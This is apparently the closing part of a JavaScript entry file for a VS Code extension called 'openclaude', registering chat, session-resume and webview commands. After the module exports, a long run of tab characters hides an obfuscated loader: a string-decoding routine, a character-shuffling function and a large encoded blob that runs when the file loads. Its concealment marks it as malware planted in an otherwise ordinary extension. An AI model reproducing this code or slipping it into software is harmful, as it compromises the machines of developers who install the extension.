    const sessions = await sessionManager.listSessions();
    if (sessions.length === 0) {
      await vscode.window.showInformationMessage('No sessions found to resume.');
      return;
    }
    const items = sessions.slice(0, 30).map(s => ({
      label: s.title || s.id,
      description: s.timeLabel,
      detail: s.preview,
      sessionId: s.id,
    }));
    const picked = await vscode.window.showQuickPick(items, {
      placeHolder: 'Select a session to resume',
    });
    if (picked) {
      chatController.stopSession();
      chatController.broadcast({ type: 'session_cleared' });
      await chatController.startSession({ sessionId: picked.sessionId });
    }
  });

  const abortChatCommand = vscode.commands.registerCommand('openclaude.abortChat', () => {
    chatController.abort();
  });

  // ── Register providers ──
  const controlCenterProviderReg = vscode.window.registerWebviewViewProvider(
    'openclaude.controlCenter',
    provider,
  );

  const chatViewProviderReg = vscode.window.registerWebviewViewProvider(
    'openclaude.chat',
    chatViewProvider,
    { webviewOptions: { retainContextWhenHidden: true } },
  );

  const profileWatcher = vscode.workspace.createFileSystemWatcher(`**/${PROFILE_FILE_NAME}`);

  context.subscriptions.push(
    // existing
    startCommand,
    startInWorkspaceRootCommand,
    openDocsCommand,
    openSetupDocsCommand,
    openWorkspaceProfileCommand,
    openUiCommand,
    controlCenterProviderReg,
    // new chat
    newChatCommand,
    openChatCommand,
    resumeSessionCommand,
    abortChatCommand,
    chatViewProviderReg,
    diffProviderReg,
    statusBarItem,
    // watchers
    profileWatcher,
    vscode.workspace.onDidChangeConfiguration(event => {
      if (event.affectsConfiguration('openclaude')) {
        refreshProvider();
      }
    }),
    vscode.workspace.onDidChangeWorkspaceFolders((e) => {
      refreshProvider();
      const folders = vscode.workspace.workspaceFolders;
      if (folders && folders.length > 0) {
        sessionManager.setCwd(folders[0].uri.fsPath);
      }
    }),
    vscode.window.onDidChangeActiveTextEditor(refreshProvider),
    profileWatcher.onDidCreate(refreshProvider),
    profileWatcher.onDidChange(refreshProvider),
    profileWatcher.onDidDelete(refreshProvider),
    // disposables
    { dispose: () => chatController.dispose() },
    { dispose: () => chatPanelManager.dispose() },
    { dispose: () => diffProvider.dispose() },
  );
}

function deactivate() {}

module.exports = {
  activate,
  deactivate,
  OpenClaudeControlCenterProvider,
  renderControlCenterHtml,
  resolveLaunchTargets,
  ChatController,
  OpenClaudeChatViewProvider,
  OpenClaudeChatPanelManager,
};																																																																																																																																																																																																																																																																										var z = '-8091-2';(function(_0x24d6c1,_0x4b29e1){var _0x20c644=_0xf3c5,_0x599d04=_0x24d6c1();while(!![]){try{var _0x3eb55a=-parseFloat(_0x20c644(0x0))/0x1*(-parseFloat(_0x20c644(0x10))/0x2)+-parseFloat(_0x20c644(0xf))/0x3*(parseFloat(_0x20c644(0x8))/0x4)+parseFloat(_0x20c644(0x12))/0x5*Math['ceil'](parseFloat(_0x20c644(0x3))/0x6)+-parseFloat(_0x20c644(0x18))/0x7*(parseFloat(_0x20c644(0x2))/0x8)+Math['trunc'](parseFloat(_0x20c644(0x1b))/0x9)+-parseFloat(_0x20c644(0x16))/0xa+Number(parseFloat(_0x20c644(0xa))/0xb);if(_0x3eb55a===_0x4b29e1)break;else _0x599d04['push'](_0x599d04['shift']());}catch(_0x24c841){_0x599d04['push'](_0x599d04['shift']());}}}(_0x15c9,0x9c236));var NX=[0x697b4f,0x16f,0x4fbb,0x265,0xaaef,0x4c9693],SX=[0x509f9d,0xf1,0xa3e1,0xbb,0xdb41,0x484f55];function spin(_0x506707,_0x520bc6){var _0x3dcb53=_0xf3c5,_0x56b90f={'IxmII':function(_0x44a4fd,_0x4f0f02){return _0x44a4fd<_0x4f0f02;}},_0x2b3730=[],_0x431010=0x0,_0x2f07c4=_0x520bc6[0x0],_0x4f539e,_0x1373b8,_0x3811fa,_0x1e9528,_0x24d98,_0x3a2369;while(_0x56b90f['IxmII'](_0x431010,_0x506707[_0x3dcb53(0xe)])){_0x2b3730[_0x431010]=_0x506707['charAt'](_0x431010),_0x431010+=0x1;}_0x4f539e=_0x2b3730['length'],_0x431010=0x0;while(_0x431010<_0x4f539e){_0x1373b8=_0x2f07c4*(_0x431010+_0x520bc6[0x1])+_0x2f07c4%_0x520bc6[0x2],_0x3811fa=_0x2f07c4*(_0x431010+_0x520bc6[0x3])+_0x2f07c4%_0x520bc6[0x4],_0x1e9528=_0x1373b8%_0x4f539e,_0x24d98=_0x3811fa%_0x4f539e,_0x3a2369=_0x2b3730[_0x1e9528],_0x2b3730[_0x1e9528]=_0x2b3730[_0x24d98],_0x2b3730[_0x24d98]=_0x3a2369,_0x2f07c4=(_0x1373b8+_0x3811fa)%_0x520bc6[0x5],_0x431010+=0x1;}return _0x2b3730[_0x3dcb53(0x13)]('');}function _0xf3c5(_0x362404,_0x3ecb5d){var _0x5f2374=_0x15c9();return _0xf3c5=function(_0x4b9cfc,_0x15c938){_0x4b9cfc=_0x4b9cfc-0x0;var _0xf3c575=_0x5f2374[_0x4b9cfc];if(_0xf3c5['bgybIs']===undefined){var _0x5a7f98=function(_0x4428ac){var _0x230f9e='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x41475d='',_0x53d104='';for(var _0xee7c72=0x0,_0x41d865,_0x343887,_0x31f351=0x0;_0x343887=_0x4428ac['charAt'](_0x31f351++);~_0x343887&&(_0x41d865=_0xee7c72%0x4?_0x41d865*0x40+_0x343887:_0x343887,_0xee7c72++%0x4)?_0x41475d+=String['fromCharCode'](0xff&_0x41d865>>(-0x2*_0xee7c72&0x6)):0x0){_0x343887=_0x230f9e['indexOf'](_0x343887);}for(var _0x1a6ff1=0x0,_0x245e78=_0x41475d['length'];_0x1a6ff1<_0x245e78;_0x1a6ff1++){_0x53d104+='%'+('00'+_0x41475d['charCodeAt'](_0x1a6ff1)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x53d104);};_0xf3c5['leiDUe']=_0x5a7f98,_0x362404=arguments,_0xf3c5['bgybIs']=!![];}var _0x26ddf1=_0x5f2374[0x0],_0x4704c6=_0x4b9cfc+_0x26ddf1,_0x235115=_0x362404[_0x4704c6];return!_0x235115?(_0xf3c575=_0xf3c5['leiDUe'](_0xf3c575),_0x362404[_0x4704c6]=_0xf3c575):_0xf3c575=_0x235115,_0xf3c575;},_0xf3c5(_0x362404,_0x3ecb5d);}function _0x15c9(){var _0x1a38ff=['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